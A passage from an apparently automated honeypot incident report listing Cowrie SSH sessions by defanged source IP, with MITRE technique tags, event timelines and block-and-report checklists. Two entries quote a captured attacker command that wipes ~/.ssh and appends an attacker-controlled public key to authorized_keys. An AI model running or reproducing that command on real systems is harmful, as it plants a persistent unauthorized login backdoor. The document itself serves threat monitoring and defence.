- [ ] Block `47.254.214[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a55dd0f5b72

| Field | Detail |
|---|---|
| **Source IP** | `8.209.236[.]13` |
| **First Seen** | 2026-07-16 10:44 |
| **Last Seen** | 2026-07-16 10:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:44:20` | `cowrie.session.connect` |
| `2026-07-16 10:44:20` | `cowrie.telnet.option` |
| `2026-07-16 10:44:20` | `cowrie.telnet.option` |
| `2026-07-16 10:44:25` | `cowrie.login.success` |
| `2026-07-16 10:44:25` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `8.209.236[.]13` to AbuseIPDB if not already reported
- [ ] Block `8.209.236[.]13` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4141cc3e06da

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-07-16 10:44 |
| **Last Seen** | 2026-07-16 10:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:44:39` | `cowrie.session.connect` |
| `2026-07-16 10:44:39` | `cowrie.client.version` |
| `2026-07-16 10:44:39` | `cowrie.client.kex` |
| `2026-07-16 10:44:40` | `cowrie.login.success` |
| `2026-07-16 10:44:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c108715e903e

| Field | Detail |
|---|---|
| **Source IP** | `203.198.173[.]137` |
| **First Seen** | 2026-07-16 10:47 |
| **Last Seen** | 2026-07-16 10:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:47:23` | `cowrie.session.connect` |
| `2026-07-16 10:47:24` | `cowrie.client.version` |
| `2026-07-16 10:47:24` | `cowrie.client.kex` |
| `2026-07-16 10:47:25` | `cowrie.login.success` |
| `2026-07-16 10:47:26` | `cowrie.direct-tcpip.request` |
| `2026-07-16 10:47:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.198.173[.]137` to AbuseIPDB if not already reported
- [ ] Block `203.198.173[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae7cdd82b549

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-16 10:48 |
| **Last Seen** | 2026-07-16 10:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:48:22` | `cowrie.session.connect` |
| `2026-07-16 10:48:22` | `cowrie.client.version` |
| `2026-07-16 10:48:22` | `cowrie.client.kex` |
| `2026-07-16 10:48:22` | `cowrie.login.success` |
| `2026-07-16 10:48:23` | `cowrie.session.params` |
| `2026-07-16 10:48:23` | `cowrie.command.input` |
| `2026-07-16 10:48:23` | `cowrie.log.closed` |
| `2026-07-16 10:48:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f7b79d0118b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-16 10:52 |
| **Last Seen** | 2026-07-16 10:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:52:53` | `cowrie.session.connect` |
| `2026-07-16 10:52:53` | `cowrie.client.version` |
| `2026-07-16 10:52:53` | `cowrie.client.kex` |
| `2026-07-16 10:52:54` | `cowrie.login.success` |
| `2026-07-16 10:52:54` | `cowrie.direct-tcpip.request` |
| `2026-07-16 10:52:54` | `cowrie.direct-tcpip.data` |
| `2026-07-16 10:52:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-129801afb028

| Field | Detail |
|---|---|
| **Source IP** | `106.13.39[.]89` |
| **First Seen** | 2026-07-16 10:56 |
| **Last Seen** | 2026-07-16 11:01 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:56:57` | `cowrie.session.connect` |
| `2026-07-16 10:56:57` | `cowrie.client.version` |
| `2026-07-16 10:56:58` | `cowrie.client.kex` |
| `2026-07-16 10:56:59` | `cowrie.login.success` |
| `2026-07-16 10:57:00` | `cowrie.session.params` |
| `2026-07-16 10:57:00` | `cowrie.command.input` |
| `2026-07-16 10:57:00` | `cowrie.command.failed` |
| `2026-07-16 10:57:00` | `cowrie.log.closed` |
| `2026-07-16 10:57:01` | `cowrie.session.params` |
| `2026-07-16 10:57:01` | `cowrie.command.input` |
| `2026-07-16 11:01:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.39[.]89` to AbuseIPDB if not already reported
- [ ] Block `106.13.39[.]89` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a13f8fd30b70

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-16 10:58 |
| **Last Seen** | 2026-07-16 10:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:58:13` | `cowrie.session.connect` |
| `2026-07-16 10:58:13` | `cowrie.client.version` |
| `2026-07-16 10:58:13` | `cowrie.client.kex` |
| `2026-07-16 10:58:13` | `cowrie.login.success` |
| `2026-07-16 10:58:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c54c00ec2c1

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-16 10:58 |
| **Last Seen** | 2026-07-16 10:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:58:13` | `cowrie.session.connect` |
| `2026-07-16 10:58:13` | `cowrie.client.version` |
| `2026-07-16 10:58:13` | `cowrie.client.kex` |
| `2026-07-16 10:58:13` | `cowrie.login.success` |
| `2026-07-16 10:58:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e82cceeaa55

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-16 10:58 |
| **Last Seen** | 2026-07-16 10:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:58:22` | `cowrie.session.connect` |
| `2026-07-16 10:58:22` | `cowrie.client.version` |
| `2026-07-16 10:58:22` | `cowrie.client.kex` |
| `2026-07-16 10:58:22` | `cowrie.login.success` |
| `2026-07-16 10:58:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e22b25acd03

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-16 10:58 |
| **Last Seen** | 2026-07-16 10:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:58:22` | `cowrie.session.connect` |
| `2026-07-16 10:58:22` | `cowrie.client.version` |
| `2026-07-16 10:58:22` | `cowrie.client.kex` |
| `2026-07-16 10:58:22` | `cowrie.login.success` |
| `2026-07-16 10:58:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00bff6849d17

| Field | Detail |
|---|---|
| **Source IP** | `59.93.36[.]136` |
| **First Seen** | 2026-07-16 11:00 |
| **Last Seen** | 2026-07-16 11:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:00:01` | `cowrie.session.connect` |
| `2026-07-16 11:00:01` | `cowrie.client.version` |
| `2026-07-16 11:00:01` | `cowrie.client.kex` |
| `2026-07-16 11:00:03` | `cowrie.login.success` |
| `2026-07-16 11:00:04` | `cowrie.direct-tcpip.request` |
| `2026-07-16 11:00:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.93.36[.]136` to AbuseIPDB if not already reported
- [ ] Block `59.93.36[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f048705dd720

| Field | Detail |
|---|---|
| **Source IP** | `61.169.54[.]150` |
| **First Seen** | 2026-07-16 11:00 |
| **Last Seen** | 2026-07-16 11:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:00:14` | `cowrie.session.connect` |
| `2026-07-16 11:00:14` | `cowrie.client.version` |
| `2026-07-16 11:00:14` | `cowrie.client.kex` |
| `2026-07-16 11:00:16` | `cowrie.login.success` |
| `2026-07-16 11:00:16` | `cowrie.direct-tcpip.request` |
| `2026-07-16 11:00:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.169.54[.]150` to AbuseIPDB if not already reported
- [ ] Block `61.169.54[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5397eeeecaf6

| Field | Detail |
|---|---|
| **Source IP** | `201.63.52[.]54` |
| **First Seen** | 2026-07-16 11:02 |
| **Last Seen** | 2026-07-16 11:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:02:41` | `cowrie.session.connect` |
| `2026-07-16 11:02:41` | `cowrie.client.version` |
| `2026-07-16 11:02:41` | `cowrie.client.kex` |
| `2026-07-16 11:02:43` | `cowrie.login.success` |
| `2026-07-16 11:02:43` | `cowrie.direct-tcpip.request` |
| `2026-07-16 11:02:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.52[.]54` to AbuseIPDB if not already reported
- [ ] Block `201.63.52[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec2404182875

| Field | Detail |
|---|---|
| **Source IP** | `211.104.166[.]110` |
| **First Seen** | 2026-07-16 11:02 |
| **Last Seen** | 2026-07-16 11:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:02:49` | `cowrie.session.connect` |
| `2026-07-16 11:02:49` | `cowrie.client.version` |
| `2026-07-16 11:02:49` | `cowrie.client.kex` |
| `2026-07-16 11:02:52` | `cowrie.login.success` |
| `2026-07-16 11:02:53` | `cowrie.direct-tcpip.request` |
| `2026-07-16 11:02:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.104.166[.]110` to AbuseIPDB if not already reported
- [ ] Block `211.104.166[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b3b95c2a370

| Field | Detail |
|---|---|
| **Source IP** | `153.37.177[.]219` |
| **First Seen** | 2026-07-16 11:06 |
| **Last Seen** | 2026-07-16 11:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:06:19` | `cowrie.session.connect` |
| `2026-07-16 11:06:19` | `cowrie.client.version` |
| `2026-07-16 11:06:19` | `cowrie.client.kex` |
| `2026-07-16 11:06:22` | `cowrie.login.success` |
| `2026-07-16 11:06:22` | `cowrie.direct-tcpip.request` |
| `2026-07-16 11:06:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.37.177[.]219` to AbuseIPDB if not already reported
- [ ] Block `153.37.177[.]219` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59de6d8bdab2

| Field | Detail |
|---|---|
| **Source IP** | `93.241.232[.]14` |
| **First Seen** | 2026-07-16 11:12 |
| **Last Seen** | 2026-07-16 11:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:12:46` | `cowrie.session.connect` |
| `2026-07-16 11:12:47` | `cowrie.client.version` |
| `2026-07-16 11:12:47` | `cowrie.client.kex` |
| `2026-07-16 11:12:47` | `cowrie.login.success` |
| `2026-07-16 11:12:47` | `cowrie.direct-tcpip.request` |
| `2026-07-16 11:12:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.241.232[.]14` to AbuseIPDB if not already reported
- [ ] Block `93.241.232[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0920e807ef1c

| Field | Detail |
|---|---|
| **Source IP** | `93.241.232[.]14` |
| **First Seen** | 2026-07-16 11:12 |
| **Last Seen** | 2026-07-16 11:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:12:52` | `cowrie.session.connect` |
| `2026-07-16 11:12:52` | `cowrie.client.version` |
| `2026-07-16 11:12:52` | `cowrie.client.kex` |
| `2026-07-16 11:12:53` | `cowrie.login.success` |
| `2026-07-16 11:12:53` | `cowrie.direct-tcpip.request` |
| `2026-07-16 11:12:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.241.232[.]14` to AbuseIPDB if not already reported
- [ ] Block `93.241.232[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d11cc61c0121

| Field | Detail |
|---|---|
| **Source IP** | `94.200.95[.]18` |
| **First Seen** | 2026-07-16 11:16 |
| **Last Seen** | 2026-07-16 11:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:16:17` | `cowrie.session.connect` |
| `2026-07-16 11:16:17` | `cowrie.client.version` |
| `2026-07-16 11:16:17` | `cowrie.client.kex` |
| `2026-07-16 11:16:19` | `cowrie.login.success` |
| `2026-07-16 11:16:20` | `cowrie.direct-tcpip.request` |
| `2026-07-16 11:16:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.200.95[.]18` to AbuseIPDB if not already reported
- [ ] Block `94.200.95[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab2c670cd5c6

| Field | Detail |
|---|---|
| **Source IP** | `65.20.187[.]47` |
| **First Seen** | 2026-07-16 11:16 |
| **Last Seen** | 2026-07-16 11:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:16:29` | `cowrie.session.connect` |
| `2026-07-16 11:16:30` | `cowrie.client.version` |
| `2026-07-16 11:16:30` | `cowrie.client.kex` |
| `2026-07-16 11:16:31` | `cowrie.login.success` |
| `2026-07-16 11:16:31` | `cowrie.direct-tcpip.request` |
| `2026-07-16 11:16:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.187[.]47` to AbuseIPDB if not already reported
- [ ] Block `65.20.187[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6aa15fb6bfa

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-16 11:17 |
| **Last Seen** | 2026-07-16 11:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:17:39` | `cowrie.session.connect` |
| `2026-07-16 11:17:39` | `cowrie.client.version` |
| `2026-07-16 11:17:39` | `cowrie.client.kex` |
| `2026-07-16 11:17:40` | `cowrie.login.success` |
| `2026-07-16 11:17:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc310e0b7b30

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-16 11:17 |
| **Last Seen** | 2026-07-16 11:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:17:39` | `cowrie.session.connect` |
| `2026-07-16 11:17:39` | `cowrie.client.version` |
| `2026-07-16 11:17:40` | `cowrie.client.kex` |
| `2026-07-16 11:17:40` | `cowrie.login.success` |
| `2026-07-16 11:17:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f914e8551a3

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-16 11:17 |
| **Last Seen** | 2026-07-16 11:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:17:46` | `cowrie.session.connect` |
| `2026-07-16 11:17:46` | `cowrie.client.version` |
| `2026-07-16 11:17:46` | `cowrie.client.kex` |
| `2026-07-16 11:17:46` | `cowrie.login.success` |
| `2026-07-16 11:17:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9d237e561e6

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-16 11:17 |
| **Last Seen** | 2026-07-16 11:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:17:46` | `cowrie.session.connect` |
| `2026-07-16 11:17:46` | `cowrie.client.version` |
| `2026-07-16 11:17:47` | `cowrie.client.kex` |
| `2026-07-16 11:17:47` | `cowrie.login.success` |
| `2026-07-16 11:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22b5248b24e0

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-16 11:23 |
| **Last Seen** | 2026-07-16 11:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:23:07` | `cowrie.session.connect` |
| `2026-07-16 11:23:07` | `cowrie.client.version` |
| `2026-07-16 11:23:07` | `cowrie.client.kex` |
| `2026-07-16 11:23:08` | `cowrie.login.success` |
| `2026-07-16 11:23:08` | `cowrie.session.params` |
| `2026-07-16 11:23:08` | `cowrie.command.input` |
| `2026-07-16 11:23:08` | `cowrie.log.closed` |
| `2026-07-16 11:23:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f609ae7c3b66

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-16 11:24 |
| **Last Seen** | 2026-07-16 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:24:14` | `cowrie.session.connect` |
| `2026-07-16 11:24:14` | `cowrie.client.version` |
| `2026-07-16 11:24:14` | `cowrie.client.kex` |
| `2026-07-16 11:24:14` | `cowrie.login.success` |
| `2026-07-16 11:24:14` | `cowrie.direct-tcpip.request` |
| `2026-07-16 11:24:14` | `cowrie.direct-tcpip.data` |
| `2026-07-16 11:24:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-917bd1960f94

| Field | Detail |
|---|---|
| **Source IP** | `3.28.44[.]14` |
| **First Seen** | 2026-07-16 11:27 |
| **Last Seen** | 2026-07-16 11:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:27:01` | `cowrie.session.connect` |
| `2026-07-16 11:27:01` | `cowrie.client.version` |
| `2026-07-16 11:27:01` | `cowrie.client.kex` |
| `2026-07-16 11:27:02` | `cowrie.login.success` |
| `2026-07-16 11:27:03` | `cowrie.session.params` |
| `2026-07-16 11:27:03` | `cowrie.command.input` |
| `2026-07-16 11:27:03` | `cowrie.command.failed` |
| `2026-07-16 11:27:03` | `cowrie.log.closed` |
